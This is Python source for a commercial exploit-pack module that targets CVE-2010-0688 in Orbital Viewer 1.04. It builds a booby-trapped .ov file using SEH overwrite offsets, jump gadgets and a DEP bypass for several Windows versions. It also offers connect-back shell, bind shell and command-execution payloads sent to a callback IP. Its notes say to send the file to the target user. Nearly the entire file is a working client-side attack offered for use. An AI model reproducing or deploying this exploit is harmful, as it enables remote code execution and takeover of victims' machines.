
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################
#Standard Imports

import sys
if '.' not in sys.path: sys.path.append('.')
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import getopt
import socket
import time
import struct

# CANVAS imports
from exploitutils import *
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from MOSDEF import mosdef
from httpclientside import httpclientside

######################################################################################
NAME='Orbital Viewer File Overflow'
DESCRIPTION='Orbital Viewer v1.04 (.orb/.ov) File Overflow'
VERSION='1.0'
CHANGELOG="""
"""
######################################################################################
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="http://www.orbitals.com"
DOCUMENTATION["Date public"] = "2010-06-20"
DOCUMENTATION['CVE Name']="CVE-2010-0688"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0688'
DOCUMENTATION["References"] = """
http://www.exploit-db.com/exploits/11581/
http://www.exploit-db.com/exploits/13940/"""
DOCUMENTATION['Notes']="""
Run the module and send the created file to the target user."""
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION'] = ["XP","Vista","7"]

DEBUGNOTES="""
"""

NOTES="""

WP> White Phosphorus Exploit Pack
WP> wp_orbital_viewer
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP SP2-SP3 DEP
1: Windows Vista/Windows 7 (Non DEP)
2: Windows Other (Non DEP)


Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_orbital_viewer/wp_orbital_viewer.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return
PORT = 0
targets={
    0 : ["Windows XP SP2-SP3 DEP", (0x00000000), [WINXPSP2, WINXPSP3]],    
    1 : ["Windows Vista/Windows 7 (Non DEP)", (0x00000000), [WINVISTA,WIN7]],    
    2 : ["Windows Other (Non DEP)", (0x00000000), [WINALL]]    
}
######################################################################################
class theexploit(wp_exploit,httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1
    
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.badstring='\0\x09\x20\x0a'
        self.name=NAME
        self.port = PORT
        self.filename='atoms.ov'
        self.version=0
        self.autoVersioned = False       
        self.use_universal=True    
        return
    
    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return
    
    def run(self):
        
        filedata=self.makefile()
        self.log('WP> Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        
        ret = self.wp_postExploitShellcode()
        if ret:
           return ret        
        
        return 1
        
    def makefile(self):

        if self.version == 0: #XP SP2/3
            depBypass = self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8) 
            seh = "\xe9\x33\x45\x00"        # add esp,410; ret 0x004533e9 [ov.exe]
            jmp_back= "\xe9\xbc\xec\xff\xff" # jmp back 
            bufsize = 4927
        elif self.version == 1:  #Windows Vista\Windows 7 Non DEP
            bufsize = 4943
            seh = "\x03\x7c\x45\x00"        # pop ebx - pop eax - ret at 0x00457C03 [ov.exe]
            jmp_back= "\xe9\xac\xec\xff\xff" # jmp back 
            depBypass = ""            
        elif self.version == 2:  #Windows XP/Other Non DEP
            bufsize = 4927
            seh = "\x03\x7c\x45\x00"        # pop ebx - pop eax - ret at 0x00457C03 [ov.exe]
            jmp_back= "\xe9\xbc\xec\xff\xff" # jmp back 
            depBypass = ""

        nseh = "\xeb\xf9\xff\xff"       # jmp back 7 bytes
        
        
        file = "OrbitalFileV1.0\n"
        file +=wp_randomstring(44)
        
        file += depBypass
        file += wp_randomnops(1060 - len(depBypass))

        file += "\xeb\x16\x44\x42"         # Need to jump over
        file += wp_randomstring(20)
        
        file += self.shellcode
        file += wp_randomstring(bufsize - len(self.shellcode))

        file += jmp_back
        file += nseh
        file += seh
                
        return file

if __name__=='__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
